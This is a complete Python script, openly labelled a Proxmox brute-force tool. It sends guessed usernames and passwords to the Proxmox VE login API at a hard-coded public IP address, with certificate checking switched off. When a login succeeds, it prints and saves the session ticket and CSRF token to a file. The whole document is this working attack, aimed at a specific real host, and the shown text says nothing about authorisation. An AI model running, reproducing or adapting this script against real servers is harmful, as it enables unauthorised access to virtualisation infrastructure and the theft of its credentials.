import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://151.80.18.179:8006"
USERS = ["root@pam", "skunky@pam", "softpigeones@pam", "root@pve", "admin@pam", "admin@pve"]
PASSWORDS = ["zalupa", "skunky", "password", "123456", "admin", "root", "skunk", "softpigeones", "lost+skunk"]

def try_login(user, password):
    try:
        r = requests.post(
            f"{URL}/api2/json/access/ticket",
            data={"username": user, "password": password},
            verify=False,
            timeout=5
        )
        if r.status_code == 200:
            data = r.json()
            if data['data']['ticket']:
                return True, data['data']['ticket'], data['data']['CSRFPreventionToken']
    except Exception as e:
        pass
        # print(f"Error: {e}")
    return False, None, None

print(f"[*] Starting Proxmox Bruteforce on {URL}...")

for user in USERS:
    for password in PASSWORDS:
        print(f"[*] Trying {user}:{password}")
        success, ticket, csrf = try_login(user, password)
        if success:
            print(f"\n[+] SUCCESS! Credentials found: {user}:{password}")
            print(f"[+] Ticket start: {ticket[:20]}...")
            print(f"[+] CSRF: {csrf}")
            
            with open("proxmox_cred.txt", "w") as f:
                f.write(f"{user}:{password}\n{ticket}\n{csrf}")
            exit(0)

print("[-] Bruteforce finished. No credentials found.")
